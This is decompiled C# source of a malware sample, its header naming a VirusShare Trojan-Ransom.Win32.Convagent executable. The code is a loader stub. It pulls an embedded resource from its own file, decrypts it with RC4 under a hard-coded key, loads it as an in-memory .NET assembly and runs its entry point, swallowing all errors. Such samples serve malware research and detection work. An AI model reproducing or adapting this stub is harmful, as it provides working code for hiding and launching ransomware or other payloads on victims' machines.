// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.jajaarhaahr
// Assembly: fede, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CA5F582-9F69-4547-B004-C63AAA213801
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fce0a6911ae4411b60800ab787a1b9c26713de1b22f54b6cb9074ea0f49b06e0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace WindowsApplication1
{
  [StandardModule]
  internal sealed class jajaarhaahr
  {
    [STAThread]
    public static void Main()
    {
      try
      {
        ArrayList arrayList = new ArrayList();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(" ".Replace(" ", Application.ExecutablePath));
        byte[] ÕÖÓ = jajaarhaahr.yo(stringBuilder.ToString());
        NewLateBinding.LateCall(NewLateBinding.LateGet(jajaarhaahr.loada((byte[]) jajaarhaahr.deca(ref ÕÖÓ)), (System.Type) null, "EntryPoint", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Invoke", new object[2]
        {
          (object) null,
          (object) null
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] yo(string file)
    {
      IntPtr hModule = jajaarhaahr.LoadLibraryA(ref file);
      IntPtr resource = jajaarhaahr.FindResource(hModule, "0", "RT_RCDATA");
      IntPtr source = jajaarhaahr.LoadResource(hModule, resource);
      int length = jajaarhaahr.SizeofResource(hModule, resource);
      byte[] destination = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, destination, 0, length);
      return destination;
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    public static object deca(ref byte[] ÕÖÓ)
    {
      byte[] numArray1 = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      byte[] numArray2 = new byte[256];
      byte[] numArray3 = new byte[256];
      int length1 = ÕÖÓ.GetLength(0);
      int length2 = numArray1.GetLength(0);
      int index1 = 0;
      do
      {
        numArray2[index1] = checked ((byte) index1);
        numArray3[index1] = numArray1[index1 % length2];
        checked { ++index1; }
      }
      while (index1 <= (int) byte.MaxValue);
      int index2 = 0;
      int index3 = 0;
      do
      {
        index2 = checked (index2 + (int) numArray2[index3] + (int) numArray3[index3]) % 256;
        byte num = numArray2[index3];
        numArray2[index3] = numArray2[index2];
        numArray2[index2] = num;
        checked { ++index3; }
      }
      while (index3 <= (int) byte.MaxValue);
      int index4 = 0;
      int index5 = index4;
      int num1 = checked (length1 - 1);
      int index6 = 0;
      while (index6 <= num1)
      {
        index5 = checked (index5 + 1) % 256;
        index4 = checked (index4 + (int) numArray2[index5]) % 256;
        byte num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int index7 = checked ((int) numArray2[index5] + (int) numArray2[index4]) % 256;
        ÕÖÓ[index6] = (byte) ((int) ÕÖÓ[index6] ^ (int) numArray2[index7]);
        checked { ++index6; }
      }
      return (object) ÕÖÓ;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    public static object loada(byte[] byta) => (object) Assembly.Load(byta);
  }
}
